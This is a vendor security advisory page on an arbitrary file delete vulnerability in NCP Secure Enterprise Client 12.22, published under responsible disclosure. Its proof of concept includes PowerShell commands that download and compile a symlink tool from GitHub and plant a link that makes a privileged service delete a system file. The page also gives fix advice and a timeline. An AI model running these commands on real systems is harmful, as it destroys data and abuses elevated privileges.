=== Content from herolab.usd.de_7d6cade7_20250114_204401.html ===

[![](https://herolab.usd.de/wp-content/uploads/sites/9/2021/07/usd-HeroLab-Logo-hell-nebeneinander.svg "usd HeroLab Logo hell nebeneinander")](https://herolab.usd.de/en/)

* [About Us](https://herolab.usd.de/en/about-us/)
  + [The Way We Work](https://herolab.usd.de/en/the-way-we-work/)
  + [Our Experts](https://herolab.usd.de/en/our-experts/)
  + [Our Services](https://www.usd.de/en/security-analysis-pentests/)
  + [Our Platforms and Tools](https://herolab.usd.de/en/our-platforms-and-tools/)
* [Security Research](https://herolab.usd.de/en/security-research/)
  + [Our Commitment](/en/security-research/#engagement)
  + [Security Advisories](https://herolab.usd.de/en/security-advisories/)
  + [Responsible Disclosure](https://herolab.usd.de/en/responsible-disclosure/)
* [LabNews](https://herolab.usd.de/en/labnews/)
* [Meet the Team](https://herolab.usd.de/en/meet-the-team/)
* [usd AG](https://www.usd.de/en/)
* [Deutsch](https://herolab.usd.de/security-advisories/usd-2022-0002/ "Deutsch")

[![](https://herolab.usd.de/wp-content/uploads/sites/9/2021/07/usd-HeroLab-Logo-hell-nebeneinander.svg)](https://herolab.usd.de/en/)

* [About Us](https://herolab.usd.de/en/about-us/)
  + [The Way We Work](https://herolab.usd.de/en/the-way-we-work/)
  + [Our Experts](https://herolab.usd.de/en/our-experts/)
  + [Our Services](https://www.usd.de/en/security-analysis-pentests/)
  + [Our Platforms and Tools](https://herolab.usd.de/en/our-platforms-and-tools/)
* [Security Research](https://herolab.usd.de/en/security-research/)
  + [Our Commitment](/en/security-research/#engagement)
  + [Security Advisories](https://herolab.usd.de/en/security-advisories/)
  + [Responsible Disclosure](https://herolab.usd.de/en/responsible-disclosure/)
* [LabNews](https://herolab.usd.de/en/labnews/)
* [Meet the Team](https://herolab.usd.de/en/meet-the-team/)
* [usd AG](https://www.usd.de/en/)
* [Deutsch](https://herolab.usd.de/security-advisories/usd-2022-0002/ "Deutsch")

# usd-2022-0002 | NCP Secure Enterprise Client - Arbitrary File Delete

**Advisory ID:** usd-2022-0002
**Product:** NCP Secure Enterprise Client
**Affected Version:** 12.22
**Vulnerability Type:** Arbitrary File Delete
**Security Risk:** High
**Vendor URL:** https://www.ncp-e.com/
**Vendor Status:** Fixed

### Description

The *NCP Secure Enterprise* client is a *VPN* and networking application that is utilized by many organisations to connect workstations
to the cooperate network. The client supports a *Support Assistant* feature, which allows low privileged user accounts to obtain diagnostic
information from the operating system. The corresponding information is gathered by high privileged services and stored within the directory
**C:\Users\\AppData\Local\Temp\NcpSupport\**. Since this directory is fully user controlled, a low privileged user can create* symbolic links *within it. This can be used to trick the* NCP Secure Enterprise\* client to delete arbitrary files on the operating system.

### Proof of Concept

To perform the arbitrary file delete, the following steps are necessary:

1. Start the *Support Assistant* and wait until all diagnostic information has been collected.
2. Create a *symbolic link* that originates from **C:\Users\\AppData\Local\Temp\NcpSupport\services.txt**
   and points to the targeted file.
3. Abort the *Support Assistant* and restart it.

After these steps have been executed, the targeted file should be deleted. In the following, we demonstrate
each of the above mentioned steps.

First we start the *Support Assistant* by using the tray icon of the *NCP Secure Enterprise* client. The *Support Assistant*
feature can be found in the upper right of the graphical user interface within the *Help* menu.

![](https://herolab.usd.de/wp-content/uploads/sites/9/2022/06/support-assistant.png)

After the diagnostic information has been collected, we create a *symbolic link* pointing from **C:\Users\\AppData\Local\Temp\NcpSupport\services.txt**
to the well known **C:\Windows\win.ini** file.

```
PS C:\> $code = (iwr https://raw.githubusercontent.com/usdAG/SharpLink/main/SharpLink.cs).content
PS C:\> Add-Type $code
PS C:\> $s = New-Object de.usd.SharpLink.Symlink("C:\Users\<USER>\AppData\Local\Temp\NCPSupport\services.txt", "C:\Windows\win.ini")
PS C:\> $s.Open()
[!] Junction directory C:\Users\<USER>\AppData\Local\Temp\NCPSupport is not empty. Delete files? (y/N) y
[+] Creating Junction: C:\Users\<USER>\AppData\Local\Temp\NCPSupport -> \RPC CONTROL
[+] Creating DosDevice: Global\GLOBALROOT\RPC CONTROL\services.txt -> \??\C:\Windows\win.ini
[+] Symlink setup successfully.
```

Now the *Support Assistant* is aborted and restarted. After this action has been performed, the **win.ini** does no longer exist.

```
PS C:\> dir C:\Windows\win.ini
dir : Der Pfad "C:\Windows\win.ini" kann nicht gefunden werden, da er nicht vorhanden ist.
In Zeile:1 Zeichen:1
+ dir C:\Windows\win.ini
+ ~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (C:\Windows\win.ini:String) [Get-ChildItem], ItemNotFoundException
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetChildItemCommand
```
### Fix

It is assumed that the *NCP Secure Enterprise* client checks for already existing diagnostic files before starting
the *Support Assistant* and attempts to delete them. This delete operation occurs with high privileges, resulting
in the vulnerability. Instead, the delete operation should be performed while impersonating the invoking user account.
This prevents the deletion of files the invoking user has insufficient permissions for.

### References

* https://www.ncp-e.com/
* https://github.com/usdAG/SharpLink

### Timeline

* 2022-02-02 First contact request via info-mv@ncp-e.com
* 2022-02-02 Advisory transfered to the vendor
* 2022-02-15 Vendor appreciates the submission of the advisories and begins to fix the identified vulnerabilities
* 2022-06-09 Responsible Disclosure Team requests an update
* 2022-06-21 Vendor annouces a new software release available in August
* 2022-08-31 NCP Secure Enterprise Client 13.10 is realesed
* 2023-03-03 This advisory is published

### Credits

These security vulnerabilities were found by Tobias Neitzel.

### About usd Security Advisories

![](https://herolab.usd.de/wp-content/uploads/sites/9/2021/07/icon-hero.png "icon-hero")

In order to protect businesses against hackers and criminals, we always have to keep our skills and knowledge up to date. Thus, security research is just as important for our work as is building up a security community to promote the exchange of knowledge. After all, more security can only be achieved if many individuals take on the task.

Our [CST Academy](https://www.usd.de/en/cst-academy/) and our [usd HeroLab](https://herolab.usd.de/en/) are essential parts of our security mission. We share the knowledge we gain in our practical work and our research through training courses and publications. In this context, the [usd HeroLab](https://herolab.usd.de/en/) publishes a series of papers on new vulnerabilities and current security issues.

Always for the sake of our mission: „more security.“

[to usd AG](https://www.usd.de/)

In accordance with usd AG’s [Responsible Disclosure Policy](/en/responsible-disclosure/), all vendors have been notified of the existence of these vulnerabilities.

##

### Disclaimer

The information provided in this security advisory is provided „as is“ and without warranty of any kind. Details of this security advisory may be updated in order to provide as accurate information as possible.

#### usd HeroLab

#### [Contact](https://www.usd.de/en/contact/)

[Imprint](https://www.usd.de/en/imprint/)

[Privacy Protection](https://www.usd.de/en/privacy-protection/)

[General Terms and Conditions](https://www.usd.de/en/terms-conditions/)

© 2025 usd AG

#### Follow Us

[![](https://herolab.usd.de/wp-content/uploads/sites/9/2023/10/usd-social-media-github.svg)](https://github.com/usdAG/)    [![](https://herolab.usd.de/wp-content/uploads/sites/9/2023/10/usd-social-media-reddit.svg)](https://www.reddit.com/user/usdAG/?rdt=60932)    [![](https://www.usd.de/wp-content/uploads/usd-social-media-youtube.svg)](https://www.youtube.com/c/usdAG)

[![](https://www.usd.de/wp-content/uploads/usd-social-media-mastodon.svg)](https://infosec.exchange/%40usdAG)[![](https://www.usd.de/wp-content/uploads/usd-social-media-meetup.svg)](https://www.meetup.com/de-DE/Cyber-Security-Transformation-Academy/?_locale=de-DE)     [![](https://www.usd.de/wp-content/uploads/usd-social-media-linkedin.svg)](https://www.linkedin.com/showcase/usd-ag-international/)

[Report a vulnerability or bug](https://www.usd.de/en/report-a-vulnerability-or-bug/)

[Code of Ethics](/en/code-of-ethics/)

#### LabNews

## [From Unicode to Exploit: The Security Risks of Overlong UTF-8 Encodings](https://herolab.usd.de/en/the-security-risks-of-overlong-utf-8-encodings/)

Sep 6, 2024

Written by Dominique Dittert, Senior Security Consultant, usd HeroLab In the dynamic field of cybersecurity, it is often the obscure and long-forgotten vulnerabilities that pose a hidden threat to otherwise hardened systems. One such vulnerability lies in invalid...

## [Security Advisories on hugocms and Gitea](https://herolab.usd.de/en/security-advisories-on-hugocms-and-gitea/)

Jul 25, 2024

The pentest professionals at usd HeroLab examined hugocms and Gitea during their pentests. Thereby, several vulnerabilities were identified. The vulnerabilities were reported to the vendors as part of the Responsible Disclosure Policy. The usd HeroLab Advisories can...

## [Security Advisory on AXIS Webcam](https://herolab.usd.de/en/security-advisory-on-axis-webcam/)

Jul 1, 2024

The pentest professionals at usd HeroLab examined the AXIS Webcam (P1364) during their pentests. Our professionals discovered a vulnerability (cross-site request forgery) in the admin panel of AXIS P1364 Webcam. Exploiting this vulnerability enables an attacker to...


